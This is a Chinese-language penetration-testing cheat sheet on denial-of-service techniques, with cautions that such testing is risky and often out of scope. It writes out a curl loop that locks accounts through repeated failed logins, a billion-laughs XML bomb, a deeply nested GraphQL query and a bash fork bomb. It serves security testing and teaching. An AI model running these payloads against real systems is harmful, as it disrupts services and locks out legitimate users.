[原文文档](README.en.md)

# 拒绝服务

> 拒绝服务(DoS)攻击旨在通过用大量非法请求淹没目标或利用目标软件中的漏洞使其崩溃或降低性能，使服务不可用。在分布式拒绝服务(DDoS)中，攻击者使用多个来源（通常是受感染的机器）同时执行攻击。

## 摘要

* [方法论](#方法论)
    * [锁定客户账户](#锁定客户账户)
    * [文件系统上的文件限制](#文件系统上的文件限制)
    * [内存耗尽 - 技术相关](#内存耗尽---技术相关)
* [参考资料](#参考资料)

## 方法论

以下是一些拒绝服务(DoS)攻击的示例。这些示例应作为理解概念的参考，但任何DoS测试都应谨慎进行，因为它可能破坏目标环境并可能导致访问丢失或敏感数据暴露。

### 锁定客户账户

在测试客户账户时可能发生的拒绝服务示例。
请务必小心，因为这很可能是**超出范围**的，可能对业务产生高影响。

* 在登录页面上多次尝试，当账户在X次错误尝试后被临时/无限期禁止时。

    ```ps1
    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
    ```

### 文件系统上的文件限制

当进程在服务器上写入文件时，尝试达到文件系统格式允许的最大文件数。系统应输出消息：`设备上没有剩余空间`当达到限制时。

| 文件系统 | 最大Inode数 |
| ---        | --- |
| BTRFS      | 2^64 (~18 quintillion) |
| EXT4       | ~4 billion |
| FAT32      | ~268 million files |
| NTFS       | ~4.2 billion (MFT entries) |
| XFS        | Dynamic (disk size) |
| ZFS        | ~281 trillion |

此技术的替代方案是填充应用程序使用的文件，直到达到文件系统允许的最大大小，例如可能在SQLite数据库或日志文件上发生。

FAT32有**4 GB**的重要限制，这就是为什么它经常被exFAT或NTFS替换用于更大文件的原因。

像BTRFS、ZFS和XFS这样的现代文件系统支持exabyte-scale文件，远远超出当前存储容量，使它们对未来大数据集具有前瞻性。

### 内存耗尽 - 技术相关

根据网站使用的技术，攻击者可能有能力触发特定函数或范式，这些函数或范式将消耗大量内存。

* **XML外部实体**：Billion laughs攻击/XML炸弹

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

* **GraphQL**：深度嵌套的GraphQL查询。

    ```ps1
    query { 
        repository(owner:"rails", name:"rails") {
            assignableUsers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
    ```

* **图像调整大小**：尝试发送带有修改头部的无效图片，例如：异常大小、大量像素。
* **SVG处理**：SVG文件格式基于XML，尝试billion laughs攻击。
* **正则表达式**：ReDoS
* **Fork炸弹**：在循环中快速创建新进程，消耗系统资源直到机器无响应。

    ```ps1
    :(){ :|:& };:
    ```

## 参考资料

* [DEF CON 32 - 漏洞赏金中DoS的实际利用 - Roni Lupin Carta - 2024年10月16日](https://youtu.be/b7WlUofPJpU)
* [拒绝服务备忘单 - OWASP备忘单系列 - 2019年7月16日](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)